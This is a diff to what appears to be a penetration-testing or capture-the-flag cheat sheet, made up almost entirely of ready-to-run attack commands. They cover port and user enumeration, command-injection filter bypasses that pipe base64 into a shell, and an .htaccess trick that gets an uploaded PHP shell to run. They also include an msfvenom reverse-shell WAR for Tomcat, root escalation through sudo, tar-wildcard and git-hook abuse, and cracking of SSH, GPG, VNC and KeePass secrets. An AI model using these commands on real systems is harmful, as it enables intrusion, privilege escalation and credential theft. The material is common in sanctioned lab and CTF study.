@@ -40,6 +40,8 @@ sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap
 # rustscan alternative (faster discovery)
 rustscan -a $IP -- -sCV
 
+# ident (113) names the user behind every open port
+ident-user-enum $IP 22 80 113 3306
 # port knocking - a filtered port that opens after a sequence (look in knockd.conf, a README, FTP)
 knock $IP 7469 8475 9842 && ssh <user>@$IP
 for p in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $p $IP; done      # no knock client needed
@@ -124,6 +126,12 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 #   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
 # cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
 # PHP type juggling: password[]=x (array -> NULL == 0) | 0e magic hashes compare equal ('0e12' == '0e99')
+# upload filter blocks .php? teach Apache a new extension instead:
+#   printf 'AddType application/x-httpd-php .zzz\n' > .htaccess   (upload it, then shell.zzz)
+#   php_flag engine on      - re-enables PHP where it was disabled for that folder
+# upload is parsed server-side? hit the parser: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268
+# Jupyter on 8888: New > Terminal is a shell. Token leaks in configs/history/ps
+#   curl -s http://<ip>:8888/api/sessions
 
 # Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
@@ -301,6 +309,7 @@ crontab -l; cat /etc/crontab
 sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
 # root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
 # root 'tar ... *' in a writable dir -> touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
+# root job runs git in a repo you can write -> .git/hooks/pre-commit (or post-commit), chmod +x, runs as root
 # restricted shell (rbash)? escape:
 ssh <user>@$IP -t bash --noprofile --norc      # or from inside: vi -> :set shell=/bin/sh :shell
 # NFS export with no_root_squash -> set the SUID bit from your box, it is honoured on theirs
@@ -363,6 +372,8 @@ kubectl auth can-i --list            # create pods -> schedule a privileged host
 hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
+# ssh2john / zip2john / rar2john / office2john / keepass2john / pfx2john / gpg2john <file> > hash.txt
+#   GPG: crack it, gpg --import key, then gpg --decrypt secret.pgp
 # creds hide in file formats, not just hashes - read the artefact before cracking anything
 vncpwd ~/.vnc/passwd                          # VNC: published DES key -> plaintext, no cracking
 kpcli --kdb db.kdbx                           # KeePass, once you have the master password
